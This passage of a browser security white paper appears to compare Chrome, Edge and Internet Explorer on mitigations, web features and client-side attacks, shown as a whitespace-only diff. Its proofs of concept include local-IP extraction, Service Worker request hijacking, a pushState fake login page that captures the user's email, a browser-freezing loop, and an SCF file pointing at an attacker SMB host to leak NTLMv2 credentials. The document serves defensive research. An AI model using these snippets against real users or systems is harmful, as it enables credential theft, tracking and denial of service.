 9.3.7      Data Execution Prevention (DEP)
 
 DEP prevents the execution of memory that is not specifically marked as containing executable code to
@@ -3628,8 +2921,6 @@ versions of Windows. For compatibility reasons, Microsoft allows to disable this
 All tested browsers enable DEP in all their processes. However, we found that the iexplore.exe binary for the
 32-bit version of Internet Explorer on our 64-bit test machine does not have DEP enabled in its headers.
 However, it seems to be enabled at runtime.
-
-
 
 9.3.8      HIGHENTROPYVA
 
@@ -3646,14 +2937,8 @@ seen to be loaded into their processes during testing.
 n
     19 https://docs.microsoft.com/en-us/cpp/build/reference/highentropyva-support-64-bit-aslr
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 76 of 197
 Browser Security White Paper
-
-
-
 
 9.3.9      Extension Point DLLs
 
@@ -3666,8 +2951,6 @@ number of their processes: Google Chrome does not allow this in GPU, PPAPI, and 
 while Microsoft Edge does not allow it in its runtime broker process. X41 D-Sec GmbH advises all vendors
 to enable this for all processes as a defense-in-depth.
 
-
-
 9.3.10       Invalid Handles
 
 An application can ask the OS to immediately terminate it as soon as it attempts to make an API call using
@@ -3678,8 +2961,6 @@ Of the tested browsers, only Internet Explorer does not enable this at all. Goog
 processes, except the main, watcher, and crashpad-handler processes. Microsoft Edge enables this in all
 processes, except the browser broker process. X41 D-Sec GmbH advises all vendors to enable this for all
 processes as a defense-in-depth.
-
-
 
 9.3.11       Low-integrity binaries
 
@@ -3692,29 +2973,19 @@ Of the tested browsers, only Google Chrome enables this mitigation in the sandbo
 GPU processes. X41 D-Sec GmbH suggests that Microsoft enables this mitigation in all below-medium-
 integrity processes in both Microsoft Edge and Internet Explorer.
 
-
-
 9.3.12       Remote DLLs
 
 An application can ask the OS not to load any DLLs from a remote (Server Message Block (SMB)) path.
 This prevents an attacker that can trigger a process to load a module from an arbitrary path from running
 arbitrary code by loading a module from a machine under the attacker’s control on the network/internet.
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 77 of 197
 Browser Security White Paper
-
-
-
 
 Of the tested browser, only Google Chrome and Microsoft Edge implement this, but only for a limited
 number of their processes: Google Chrome does not allow this in GPU, PPAPI, and renderer processes,
 while Microsoft Edge does not allow it in its Internet or Intranet AppContainer. X41 D-Sec GmbH advises
 all vendors to enable this for all processes as a defense-in-depth.
-
-
 
 9.3.13       Syscall Proxying
 
@@ -3726,11 +2997,7 @@ require access to these syscalls directly, the application can ask the OS not to
 syscall. This prevents an attacker that is able to compromise the process from attempting to exploit any
 vulnerability in win32k.sys in order to escalate their privileges.
 
-
-
-
                                Figure 9.1: Google Chrome Componenents / Win32k Abstraction
-
 
 9.3.13.0.1      Win32k Lockdown Of the tested browsers, only Google Chrome implements a syscall filter
 (see figure 9.1), but only for its PPAPI and renderer processes. Because both of these types of process do
@@ -3740,14 +3007,8 @@ limits an attacker’s access to the win32k attack surface.
 The use of 32bit syscalls is restricted using the System Call Disable Policy20 . By using the function SetPro-
  20 https://msdn.microsoft.com/en-us/library/windows/desktop/hh871472(v=vs.85).aspx
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 78 of 197
 Browser Security White Paper
-
-
-
 
 cessMitigationPolicy21 provided by the Microsoft Windows OS, a runtime policy can be set on a process in
 order to disable the 32bit syscalls.
@@ -3761,8 +3022,6 @@ fine-grained access to certain dangerous functions. In case of 32bit syscalls fo
 Chrome to prevent the renderers from making any 32bit syscall, yet using the syscall proxy a renderer
 might use certain 32bit syscalls remotely if they are considered safe.
 
-
-
 9.3.14       Out-of-process JavaScript compilation
 
                                        Browser             Out-of-process
@@ -3771,7 +3030,6 @@ might use certain 32bit syscalls remotely if they are considered safe.
                                        Internet Explorer   #
 
                                Table 9.4: Out-of-process JavaScript Compilation
-
 
 Modern JavaScript engines can compile JavaScript into native machine code that can be executed directly
 on the Central processing Unit (CPU) for added speed. To do this, they need to create a writable memory
@@ -3785,8 +3043,6 @@ As shown in table 9.4 and tested by inspecting the source code of the JavaScript
 uses out-of-process JavaScript compilation and Google Chrome does not use out-of-process JavaScript
 compilation. Internet Explorer does not compile JavaScript, but interprets it in the traditional way.
 
-
-
 9.3.15       Safe Structured Exception Handling (SafeSEH) / Structured Exception Han-
              dling Overwrite Prevention (SEHOP)
 
@@ -3796,12 +3052,8 @@ Safe Structured Exception Handling (SafeSEH) prevents the execution of any Struc
  22 https://cs.chromium.org/chromium/src/sandbox/win/src/interception.h?type=cs&q=AddToPatchedFunctions&l=
 269
 
-
 X41 D-SEC GmbH                                                                                      Page 79 of 197
 Browser Security White Paper
-
-
-
 
 of valid exception handlers to the OS, which the OS uses when an exception is thrown to check if the SEH
 information on the stack has been tampered with and points to something that is not in this list. An attempt
@@ -3818,8 +3070,6 @@ unhandled exception and process termination.
 All the binaries used by all the browsers and all the binaries loaded by them were found to enable SafeSEH.
 SEHOP is on by default for all processes in all modern versions of Microsoft Windows and none of the
 tested browsers explicitly disable it.
-
-
 
 9.3.16       Signature checks
 
@@ -3848,14 +3098,8 @@ Since Google Chrome is not developed by Microsoft and not a Store-app, it cannot
 -handler-seh-overwrites-with-sehop/
   25 http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 80 of 197
 Browser Security White Paper
-
-
-
 
 9.3.17       System Fonts only
 
@@ -3866,8 +3110,6 @@ in the font rendering components of Microsoft Windows.
 Of the tested browser, only Google Chrome implements this, but only for its GPU, PPAPI, and renderer
 processes. X41 D-Sec GmbH advises all vendors to enable this for all processes as a defense-in-depth,
 assuming that none of these processes require this feature.
-
-
 
 9.3.18       VTGuard
 
@@ -3892,7 +3134,6 @@ coverage for a module.
 
 Our tests of VTGuard show the following results on a 64-bit version of Windows:
 
-
     • edgehtml.dll implemented VTGuard in 829 of 6548 classes (12.7% coverage)
 
     • iertutil.dll implements VTGuard in 5 of 107 classes (4.7% coverage)
@@ -3901,17 +3142,10 @@ Our tests of VTGuard show the following results on a 64-bit version of Windows:
 
  26 http://www.geoffchappell.com/studies/windows/ie/iertutil/
 
-
-
-
 X41 D-SEC GmbH                                                                                       Page 81 of 197
 Browser Security White Paper
 
-
-
-
 The effectiveness of VTGuard in mitigating exploitation depends on a number of factors:
-
 
    1. the number of vulnerabilities that allow an attacker to manipulate a vftable pointer
 
@@ -3921,7 +3155,6 @@ The effectiveness of VTGuard in mitigating exploitation depends on a number of f
    3. the percentage of such vulnerabilities that do not provide a way to leak information that can be used
        to determine the canary value.
 
-
 Only by compiling a statistically significant data set of the above factors is it possible to make a reasonable
 prediction on how effective implementing VTGuard would be as a mitigation against future exploitation.
 Because this information is not publicly available, and certainly not in a format we could gather and process
@@ -3930,9 +3163,6 @@ about how useful VTGuard is in mitigating exploitation of vulnerabilities in rea
 
 The use of CFG does not contradict the use of VTGuard, since both mechanisms try to protect indirect calls
 in different ways and neither catches all possible cases.
-
-
-
 
 X41 D-SEC GmbH                                                                                       Page 82 of 197
 10           Early Adoption of Hardening Features
@@ -3953,8 +3183,6 @@ instead.
 
                                   Table 10.1: Adoption of Hardening Features
 
-
-
 Due to the different features sets and proprietary development of certain parts of the browsers, it was not
 possible to perform a completely fair comparison. The introduction of some features in Google Chrome can
 be tracked via its bug tracker, but the availability of a patch at a certain data does not necessarily mean that
@@ -3967,14 +3195,8 @@ release builds of their browsers, X41 D-Sec GmbH was not able to check all versi
 not possible to gather information for all hardening features.
   1 https://medium.com/@justin.schuh/securing-browsers-through-isolation-versus-mitigation-15f0baced2c2
 
-
-
-
                                                       83
 Browser Security White Paper
-
-
-
 
 10.1        DEP
 
@@ -3983,15 +3205,11 @@ earliest version X41 D-Sec GmbH could get their hands on. Microsoft Edge support
 release from 2015-07-30. DEP was supported in Internet Explorer 9, which was the earliest version that
 could be found.
 
-
-
 10.2        ADDRESS SPACE LAYOUT RANDOMIZATION (ASLR)
 
 Google Chrome supports ASLR since version 2.0.172, which was released on 2009-05-24. Microsoft Edge
 supports ASLR since the earliest release from 2015-07-30. ASLR was supported in Internet Explorer 9,
 which was the earliest version that could be found.
-
-
 
 10.3        HIGHENTROPYVA
 
@@ -3999,8 +3217,6 @@ The first Google Chrome release for 64-bit was on 2014-08-262 , therefore this i
 TROPYVA could be supported. Microsoft Edge supports HIGHENTROPYVA since the earliest release from
 2015-07-30. HIGHENTROPYVA is not supported in Internet Explorer 9, but was introduced in version 10
 which was released on 2012-11-13.
-
-
 
 10.4        CFG
 
@@ -4012,14 +3228,9 @@ Internet Explorer version released with Windows 10 on 2015-07-29 supports CFG as
 Windows 8.1, support for CFG was introduced with KB30008504 , which updated Internet Explorer from
 11.0.7 to 11.0.14 and enabled CFG on 2014-11-17
 
-
-
-
    2 https://blog.chromium.org/2014/08/64-bits-of-awesome-64-bit-windows_26.html
    3 https://bugs.chromium.org/p/chromium/issues/detail?id=584575
    4 https://www.microsoft.com/en-us/download/details.aspx?id=44977
-
-
 
 X41 D-SEC GmbH                                                                               Page 84 of 197
     11           Web Security
@@ -4036,12 +3247,7 @@ X41 D-SEC GmbH                                                                  
     mode1 . The following meta tag can be added in the head of a webpage, to have VML and VBScript enabled
     in Internet Explorer, lowering the Document mode to Internet Explorer 9:
 
-
-
 1   <meta http-equiv="X-UA-Compatible" content="IE=9" />
-
-
-
 
     Old techniques that allowed to lower the Document mode from a page already rendered with a higher
     Document mode, via iframes for example, do not work anymore, meaning that forcing Internet Explorer
@@ -4057,14 +3263,8 @@ X41 D-SEC GmbH                                                                  
       2 https://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-w
     indows/#.VGNwwPnF-Sq
 
-
-
-
                                                          85
 Browser Security White Paper
-
-
-
 
 11.1        SAME ORIGIN POLICY ENFORCEMENT
 
@@ -4110,17 +3310,10 @@ one of these blank origin iframes. Twitter for instance has a blank iframe calle
 The code in listing 11.1 is a PoC for Microsoft Edge that triggers an alert box coming from the affected
    3 https://www.brokenbrowser.com/sop-bypass-uxss-tweeting-like-charles-darwin
 
-
-
-
 X41 D-SEC GmbH                                                                                        Page 86 of 197
      Browser Security White Paper
 
-
-
-
      origin.
-
 
  1   <html>
  2   <body>
@@ -4134,27 +3327,18 @@ X41 D-SEC GmbH                                                                  
  9   </body>
 10   </html>
 
-
-
                                      Listing 11.1: PoC for Microsoft Edge SOP Bypass
-
 
      Google Chrome is not vulnerable since the SOP is enforced correctly, and throws the error shown in
      figure 11.1.
 
-
-
-
                                     Figure 11.1: Chrome returning a SOP violation error
-
 
      SOP bypass vulnerabilities are often the result of highly specific logic bugs that are hard to compare. X41
      D-Sec GmbH therefore decided to compare the handling of published SOP bypasses by the different
      vendors. The number of still working bypasses discovered by Manuel Caballero affecting Microsoft Edge4
      and Internet Explorer was higher than in Google Chrome at the time of writing. This hints at a better
      handling of SOP bypasses by the Google Chrome vendor.
-
-
 
      11.2        PORT BANNING ENFORCEMENT
 
@@ -4167,13 +3351,8 @@ X41 D-SEC GmbH                                                                  
         4 https://docs.google.com/spreadsheets/d/1L_cskKEXUjt5l3zCj1lvRJgAah0OrW1cU7SBTAuXJsI/pubhtml?gid=0&sing
      le=true
 
-
-
      X41 D-SEC GmbH                                                                                   Page 87 of 197
 Browser Security White Paper
-
-
-
 
 technique, also known as Inter-protocol Exploitation, has been discussed in details in the Browser Hacker’s
 Handbook5 .
@@ -4199,8 +3378,6 @@ following tables 11.1 and 11.2:
 
                           Table 11.1: TCP Ports Banned by Microsoft Edge and Internet Explorer
 
-
-
                            1       7        9         11     13       15       17      19
                            20      21       22        23     37       42       43      53
                            77      79       87        95     101      102      103     104
@@ -4212,9 +3389,6 @@ following tables 11.1 and 11.2:
 
                                     Table 11.2: TCP Ports Banned by Google Chrome
 
-
-
-
 11.3        CONTENT SECURITY POLICY ENFORCEMENT
 
 Content Security Policy (CSP) is a HTTP response header that sites can set to limit what sources of scripts
@@ -4222,13 +3396,8 @@ are acceptable in the context of the document being served. This helps to mitiga
    5 https://www.amazon.com/Browser-Hackers-Handbook-Wade-Alcorn/dp/1118662091
    6 https://www.youtube.com/watch?v=oDnzTYwo8p4
 
-
-
 X41 D-SEC GmbH                                                                                   Page 88 of 197
     Browser Security White Paper
-
-
-
 
     data injection. It uses a strict whitelist approach to specify which origins are allowed for which content.
     Since it was introduced mostly as an XSS mitigation, inline code (for example in attributes) and dangerous
@@ -4239,13 +3408,9 @@ X41 D-SEC GmbH                                                                  
     where scripts are allowed only from the whitelisted HyperText Transfer Protocol Secure (HTTPS) resource,
     eval is explicitly allowed, and objects can not be loaded from different origins.
 
-
 1   script-src 'self' 'unsafe-eval' https://api.penitenziagite.club; object-src 'self'
 
-
-
                                                  Listing 11.2: Relaxed CSP
-
 
     Historically, CSP implementations in browsers have a long history of bypasses. Moreover, in April 2017, at
     OWASP 20177 , Michele Spagnuolo and Lukas Weichselbaum presented8 CSP bypasses for Google Chrome
@@ -4262,7 +3427,6 @@ X41 D-SEC GmbH                                                                  
 
     The following are the bypasses that were still unpatched in Google Chrome10 :
 
-
         • Aurelia (2017-03-21)
 
         • Polymer 1.7.1
@@ -4271,7 +3435,6 @@ X41 D-SEC GmbH                                                                  
 
         • Dojo 1.12.2
 
-
     This is yet another example proving that CSP can still be bypassed in all modern browsers, and should not
     be considered a panacea against XSS.
        7 https://www.owasp.org
@@ -4279,14 +3442,8 @@ X41 D-SEC GmbH                                                                  
        9 https://www.chromestatus.com/feature/5633814718054400
      10 https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md
 
-
-
-
     X41 D-SEC GmbH                                                                                  Page 89 of 197
 Browser Security White Paper
-
-
-
 
 11.4        HTML5 FEATURES SUPPORT AND NEW WEB TECHNOLOGIES
 
@@ -4324,33 +3481,24 @@ Table 11.3 summarizes the support for the new features analyzed.
              Table 11.3: Supported HTML5 Features And New Technologies ( - True, # - False, G
                                                                                             # - Partly)
 
-
-
 Support for new features introduces new code in the browser, therefore it potentially introduces new
 security bugs. Having said that, it does not mean a browser that supports fewer features like Internet
 Explorer, is more secure, or that Google Chrome is less secure than Microsoft Edge because it supports
 more features. The features analyzed have been chosen by X41 D-Sec GmbH since they can be potentially
 abused by attackers.
 
-
-
 11.4.1       Service Workers
 
 Service Workers were born as a replacement for AppCache, an experimental API to have offline user
 experience in the browser. A Service Worker is JavaScript code that runs in the background, having
 
-
 X41 D-SEC GmbH                                                                                            Page 90 of 197
 Browser Security White Paper
-
-
-
 
 network fetches access across the same origin as well as postMessage to communicate with the parent
 page.
 
 Service Workers are instantiated when the following actions trigger:
-
 
     • prefetching content
 
@@ -4361,7 +3509,6 @@ Service Workers are instantiated when the following actions trigger:
     • background synchronization
 
     • push notifications
-
 
 A Service Worker has the capability to create new requests and responses as well as filter and modify
 them. The worker registration process is required to use a HTTPS resource to prevent standard Man-in-
@@ -4394,14 +3541,8 @@ prototype overriding of objects to hijack same-origin calls and open cross-origi
  12 https://sirdarckcat.blogspot.it/2015/05/service-workers-new-apis-new-vulns-fun.html
  13 https://github.com/beefproject/beef/tree/master/modules/persistence/man_in_the_browser
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 91 of 197
      Browser Security White Paper
-
-
-
 
      Although Service Workers do not introduce new vulnerabilities, they might help an attacker to chain
      or exploit other server-side vulnerabilities or misconfigurations, such as unfiltered JavaScript Object
@@ -4430,10 +3571,7 @@ X41 D-SEC GmbH                                                                  
 11             e.fetch(e.request)
 12   } //
 
-
-
                                             Listing 11.3: Hooking of onfetch
-
 
      As a result of hooking the onfetch call, persistence in the origin is achieved, as proven by the screenshot in
      figure 11.2 showing two different resources being hijacked in the same way.
@@ -4441,8 +3579,6 @@ X41 D-SEC GmbH                                                                  
      ServiceWorkers support in Microsoft Edge is still experimental, and needs to be enabled via about:flags.
      However even after enabling it, it was not clear how to call the navigator.serviceWorker.register method,
      since the navigator was not referencing the serviceWorker object.
-
-
 
      11.4.2       WebRTC And ORTC
 
@@ -4454,15 +3590,10 @@ X41 D-SEC GmbH                                                                  
      directly on a local network. To be able to create these connections, the website needs to be able to
      determine the IP addresses (intranet and Internet) of the machine it is running on. There are APIs in both
 
-
      X41 D-SEC GmbH                                                                                    Page 92 of 197
     Browser Security White Paper
 
-
-
-
                          Figure 11.2: Hook persistence across same-origin resource via ServiceWorkers
-
 
     WebRTC and ORTC that allow a website to determine these IP addresses. An attacker can abuse these
     APIs to leak the local network IP address and abuse it in further attacks against the local network.
@@ -4480,7 +3611,6 @@ X41 D-SEC GmbH                                                                  
     in Microsoft Edge. It does not work against Google Chrome or Internet Explorer, as neither currently
     implement the RTCIceGatherer API of ORTC.
 
-
 1   var oRTCIceGatherer = new RTCIceGatherer({
 2           "gatherPolicy": "all",
 3           "iceServers": [ ],
@@ -4491,16 +3621,10 @@ X41 D-SEC GmbH                                                                  
 8      };
 9   };
 
-
-
                                          Listing 11.4: Using ORTC to Extract Local IP
-
 
     X41 D-SEC GmbH                                                                                      Page 93 of 197
      Browser Security White Paper
-
-
-
 
      Microsoft Edge provides a setting in the "about:config" page that allows a user to prevent the ORTC API
      from disclosing local IP addresses, but the default settings is to enable local IP addresses. Furthermore, this
@@ -4548,21 +3672,14 @@ X41 D-SEC GmbH                                                                  
 35      }
 36   );
 
-
-
                                         Listing 11.5: WebRTC Local IP Extraction
-
 
      Google Chrome currently does not offer a setting that allows the user to prevent the WebRTC API from
      disclosing local IP addresses. There are a number of third-party extensions available that attempt to do
      this, with varying degrees of success. This makes it highly unlikely that the average user will disable it.
 
-
      X41 D-SEC GmbH                                                                                     Page 94 of 197
      Browser Security White Paper
-
-
-
 
      11.4.3       History Management
 
@@ -4573,7 +3690,6 @@ X41 D-SEC GmbH                                                                  
      The following code (see listing 11.6) is an example on how to abuse the history.pushState call, which is used
      to add a new entry to the browser history. The new entry URL needs to be same-origin of the one where
      the history call originated, otherwise an exception is thrown.
-
 
  1   var replace = "/session.00001231234212324234234123.accounts.google.com/mail/#inbox"
  2   history.pushState({},'', replace);
@@ -4607,10 +3723,7 @@ X41 D-SEC GmbH                                                                  
 
 26   })
 
-
-
                                     Listing 11.6: Abuse of history.pushState - Example 1
-
 
      In the code above the current page body is replaced with a Google Account login page, overrides the form
      submission and intercepts the email entered. It is possible to modify the code to support entering the
@@ -4622,15 +3735,10 @@ X41 D-SEC GmbH                                                                  
 
      Another way of abusing this feature is to freeze the current tab (or even the whole browser) by just calling
 
-
      X41 D-SEC GmbH                                                                                    Page 95 of 197
     Browser Security White Paper
 
-
-
-
     pushState in a loop, like presented in the code in listing 11.7.
-
 
 1   a='lol';
 2   for(b=0;b<999999;b++){
@@ -4638,10 +3746,7 @@ X41 D-SEC GmbH                                                                  
 4     a=a+b;
 5   }
 
-
-
                                     Listing 11.7: Abuse of history.pushState - Example 2
-
 
     Running the code above will make the current tab and also the entire browser unresponsive while the code
     runs. This behavior was supposed to be patched by limiting the number of pushState calls per second, but it
@@ -4649,20 +3754,11 @@ X41 D-SEC GmbH                                                                  
     affected by this problem, and the code above does not trigger any Denial of Service (DoS) or CPU/memory
     spikes.
 
-
-
-
     Figure 11.3: Modifying the controlled origin content to harvest credentials confusing the victim via history.pushState
      14 https://bugs.chromium.org/p/chromium/issues/detail?id=394296
 
-
-
-
     X41 D-SEC GmbH                                                                                            Page 96 of 197
 Browser Security White Paper
-
-
-
 
 11.4.4       WebAssembly
 
@@ -4675,12 +3771,10 @@ flags in version 15.15063 or later. It is not available in Internet Explorer and
 
 In terms of security impact there are two main threat scenarios to be considered:
 
-
    1. Attacks using WASM against the browser, other components, or the operating system (privilege
        escalation).
 
    2. Attacks against applications implemented using WASM.
-
 
 We consider the first scenario to provide an attack surface very similar to JavaScript. The same sandboxing
 strategies and mitigations seem to be employed in the browsers. In Google Chrome WASM programs run
@@ -4702,10 +3796,7 @@ inaccessible for read or write by the application itself at runtime.
 The general security design choices, remarks and techniques in the following apply to both Google Chrome
 and Microsoft Edge.
 
-
-
 11.4.4.1     Handling of Application Level Invalid Actions and Error Cases
-
 
 We discovered some unexpected behavior in our tests using emcc (Emscripten gcc/clang-like replacement
 + linker emulating GNU ld) 1.37.14 clang version 4.0.0 (emscripten 1.37.14 : 1.37.14) on Linux to compile
@@ -4713,13 +3804,8 @@ We discovered some unexpected behavior in our tests using emcc (Emscripten gcc/c
  16 https://llvm.org
  17 https://github.com/rust-lang/rust/issues/33205
 
-
-
 X41 D-SEC GmbH                                                                                   Page 97 of 197
     Browser Security White Paper
-
-
-
 
     WASM binaries from C code. When running the binaries on Microsoft Windows and testing various error
     conditions it was discovered that even though the documentation mentions traps18 , no traps for faulty
@@ -4732,7 +3818,6 @@ X41 D-SEC GmbH                                                                  
 
     An example function where no trap was hit when compiled to WASM is shown in listing 11.8.
 
-
 1   unsigned char stack_oob_read() {
 2           char buf[256];
 3           for (size_t i = 0; i < sizeof(buf); i++)
@@ -4740,10 +3825,7 @@ X41 D-SEC GmbH                                                                  
 5           return buf[256]; //oob
 6   }
 
-
-
                                           Listing 11.8: Out-of-Bounds Read
-
 
     When compiled using the command line emcc wasmtests.c -O2 -s "BINARYEN_TRAP_MODE=’allow’"
     -s WASM=1 -s SIDE_MODULE=1 -o wasmtests.wasm, no trap was observed.
@@ -4762,23 +3844,15 @@ X41 D-SEC GmbH                                                                  
     that application level unsafe behaviour will not occur. We recommend to all browser vendors to consider
     this regarding runtime checks and future improvements to the WASM specification.
 
-
-
     11.4.4.2     Arithmetic Overflows and Truncation
-
 
     All tested WASM implementations were implementing the wasm32 architecture variant. An ILP32 model
     was used here. This model is using 32-bit for int, long, and pointer types. ILP32 uses 64-bit for the type
      18 https://github.com/kripken/emscripten/wiki/WebAssembly
      19 http://webassembly.org/docs/security/
 
-
-
     X41 D-SEC GmbH                                                                                    Page 98 of 197
      Browser Security White Paper
-
-
-
 
      long long, yet using long long types in the tested C code led to an error being emitted when importing
      the WASM binary. Truncation and wrap-arounds were observed on values being passed directly from
@@ -4789,19 +3863,14 @@ X41 D-SEC GmbH                                                                  
      For example the following function (see listing 11.9) defined in C could be called from JavaScript using a
      value not representable by 32 bits.
 
-
  1   long arg_over(unsigned long val) {
  2           // overflow while passing val?
  3           return val;
  4   }
 
-
-
                                       Listing 11.9: C Function With long Argument
 
-
      The following code passes value 8589934590 into the function arg_over as defined in listing 11.10.
-
 
  1        // Check for wasm support.
  2        if (!('WebAssembly' in window)) {
@@ -4837,12 +3906,8 @@ X41 D-SEC GmbH                                                                  
 31            });
 32        }
 
-
      X41 D-SEC GmbH                                                                                   Page 99 of 197
      Browser Security White Paper
-
-
-
 
 33         // Main part of this example, loads the module and uses it.
 34         loadWebAssembly('wasmtests.wasm')
@@ -4858,10 +3923,7 @@ X41 D-SEC GmbH                                                                  
 44            }
 45         );
 
-
-
                                         Listing 11.10: JavaScript Calling C Function
-
 
      The returned value of arg_over is -2. The LEGALIZE_JS_FFI 20 flag did not have any effect here.
 
@@ -4869,10 +3931,7 @@ X41 D-SEC GmbH                                                                  
      during import of a WASM binary file, the browsers could introduce runtime checks to warn or prevent
      arithmetic overflows.
 
-
-
      11.4.4.3     WASM Mitigations and Exploit Primitives
-
 
      Also, return addresses of the call stack are in a protected space not reachable by linear buffer overflows,
      branches are constrained to the current function, and function calls are checked to be contained in the
@@ -4882,30 +3941,21 @@ X41 D-SEC GmbH                                                                  
      Yet since WASM emits JIT compiled code, it might be used to create Return-Oriented Programming (ROP)
      gadgets or other kinds of primitives such as the C function shown in listing 11.11.
 
-
  1   // write 0x41 to ptr + offset
  2   void ptrWrite(char *ptr, int offset ) {
  3     char *optr = *ptr+(char *)offset;
  4     *optr = '\x41';
  5   }
 
-
-
                                      Listing 11.11: ROP Gadget Generation with WASM
-
 
      When passing through LLVM the native instructions shown in listing 11.12 were emitted, that might be
      useful for exploitation.
       20 https://github.com/kripken/emscripten/blob/663fd4213575c8d52d799c0b1a9d95e182f6687f/src/settings.js#L
      725
 
-
-
      X41 D-SEC GmbH                                                                                 Page 100 of 197
     Browser Security White Paper
-
-
-
 
 1   wasm-function[0]:
 2     sub rsp, 8                            ; 0x000000 48 83 ec 08
@@ -4916,10 +3966,7 @@ X41 D-SEC GmbH                                                                  
 7     add rsp, 8                            ; 0x000012 48 83 c4 08
 8     ret                                   ; 0x000016 c3
 
-
-
                                          Listing 11.12: WASM ROP Gadgets
-
 
     While the above code is safe inside WASM contexts, an attacker might misuse it in other contexts.
 
@@ -4942,8 +3989,6 @@ X41 D-SEC GmbH                                                                  
     size constraints on function arguments that should trigger a warning when such functions are imported
     and made accessible for JavaScript code.
 
-
-
     11.4.5       WebGL
 
     All three analyzed browsers support the rendering of 3D graphics in web contexts with WebGL. It allows
@@ -4955,26 +4000,16 @@ X41 D-SEC GmbH                                                                  
     are passed to abstraction layers and compiled there before being passed to the hardware. Google Chrome
      21 https://www.opengl.org/registry/doc/GLSLangSpec.4.50.pdf
 
-
-
-
     X41 D-SEC GmbH                                                                                  Page 101 of 197
 Browser Security White Paper
-
-
-
 
 uses Almost Native Graphics Layer Engine (ANGLE)22 as abstraction layer and in Microsoft Edge GLSL pro-
 grams are translated using a transpiler23 to the Microsoft High Level Shading Language (HLSL) that works
 on Direct3D 10.
 
-
-
 11.4.5.1     Attack Surface
 
-
 The attack surface of WebGL can be divided into three areas:
-
 
    1. Attacks against the graphics kernel drivers.
 
@@ -4982,7 +4017,6 @@ The attack surface of WebGL can be divided into three areas:
 
    3. Attacks against other contexts via information leaks (timing attacks, shaders, resources from different
        origins), or exploitation of intermediate parsers (in WebGL code).
-
 
 Especially the first two areas may enable an attacker to gain the highest privileges on a system and may
 allow to escape the browser sandbox. This is true for both browsers since kernel drivers and hardware are
@@ -4993,10 +4027,7 @@ To mitigate possible security problems, API calls and shader programs are saniti
 The ANGLE library of Google Chrome and the WebGL transpiler of Microsoft Edge are prime targets for
 exploitation since they parse untrusted complex data originating from web origins.
 
-
-
 11.4.5.2     Mitigations, Sandboxing and Hardening
-
 
 A dedicated process is used by Google Chrome for rendering tasks and to communicate with graphics
 drivers. This task is running with a low integrity level. It is therefore less restricted than renderers, the PDF
@@ -5014,14 +4045,8 @@ rendering. Microsoft Edge renders WebGL inside a content process that is restric
  22 https://github.com/google/angle
  23 https://windowsforum.com/threads/open-sourcing-the-microsoft-edge-webgl-glsl-transpiler.221512/
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 102 of 197
 Browser Security White Paper
-
-
-
 
 In terms of direct control flow hijacking using WebGL we consider that this mainly depends on the quality
 of the abstraction libraries ANGLE and the Microsoft Edge/ Internet Explorer transpiler and possible bugs
@@ -5047,8 +4072,6 @@ nerabilities. We propose to further lock down a standalone WebGL process and pos
 abstraction layer into the renderer process. Yet it has to be ensured that no validation and security relevant
 verification tasks are moved into the renderer that could be modified to increase the kernel attack surface.
 
-
-
 11.4.6       Web Notifications
 
 The Web Notifications API24 allows websites to alert the user by showing a small window outside of the
@@ -5068,14 +4091,8 @@ through a bug in the OS notification system, since the OS notification system wi
 browser sandbox.
  24 https://notifications.spec.whatwg.org/
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 103 of 197
 Browser Security White Paper
-
-
-
 
 Of the tested browsers, only Microsoft Edge uses the built-in notification system of the OS. Google Chrome
 creates the notification window itself and does not need to rely on external processes to show notifications.
@@ -5115,14 +4132,8 @@ near future. This makes sense, as an attacker able to launch a MITM attack again
 with notification privileges, could insert script to use those privileges to show notifications without the
 user’s explicit consent.
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 104 of 197
 Browser Security White Paper
-
-
-
 
 11.4.7       Battery Status API
 
@@ -5135,14 +4146,9 @@ disabled their implementation of the Battery Status API in Firefox.
 
 Of the tested browsers, only Google Chrome implemented the Battery Status API.
 
-
-
-
  25 https://www.w3.org/TR/battery-status/
  26 https://blog.lukaszolejnik.com/battery-status-readout-as-a-privacy-risk/
  27 https://lukaszolejnik.com/battery.pdf
-
-
 
 X41 D-SEC GmbH                                                                                Page 105 of 197
 12           Client-side Attack Vectors
@@ -5155,14 +4161,10 @@ during phishing campaigns, the anti-phishing engines used by both Microsoft Edge
 have been tested. Finally, browser extensions are analysed, discussing their permissions models as well as
 malicious use.
 
-
-
 12.1      COMMON CLIENT-SIDE ATTACKS
 
 There are many client-side techniques that could be discussed and we will cover a few exemplarily that are
 practical and work against the tested browsers.
-
-
 
 12.1.1     Downloads And Dangerous Filetypes
 
@@ -5180,14 +4182,8 @@ Automatic downloads open up for a number of attacks that rely on the response to
   1 https://cs.chromium.org/chromium/src/chrome/browser/resources/safe_browsing/download_file_types.asciip
 b?q=asciipb+package:%5Echromium$&l=1
 
-
-
-
                                                      106
     Browser Security White Paper
-
-
-
 
     to disk by the OS or applications installed on the system. For instance, if some indexing or anti-virus service
     is installed that attempts to inspect different types of files written to disk by parsing various file-formats,
@@ -5202,14 +4198,10 @@ b?q=asciipb+package:%5Echromium$&l=1
     listing 12.1. This results in the NT LAN Manager v2 (NTLMv2) credentials being sent to the SMB server
     where the resource is stored.
 
-
 1   [Shell]
 2   IconFile=\\6.6.6.6\icon
 
-
-
                                                 Listing 12.1: Icon File SCF example
-
 
     An attacker could set up a SMB server and force-download a SCF file when a victim browsed a website
     under their control: the .scf file extension was until recently considered safe (see figure 12.1) to download.
@@ -5217,24 +4209,15 @@ b?q=asciipb+package:%5Echromium$&l=1
     which referenced an icon file on the attacker’s SMB server. Windows would attempt to retrieve the icon
     file and in the process leak the user’s credentials to the attacker’s server.
 
-
-
-
                                Figure 12.1: Responder collecting hashes thanks to the credential leak
-
 
     Google Chrome mitigated this problem by blacklisting SCF files in the SafeBrowsing code, with the new
     entry shown in listing 12.2.
          2 https://www.blackhat.com/docs/us-15/materials/us-15-Brossard-SMBv2-Sharing-More-Than-Just-Your-Files.p
     df
 
-
-
     X41 D-SEC GmbH                                                                                      Page 107 of 197
      Browser Security White Paper
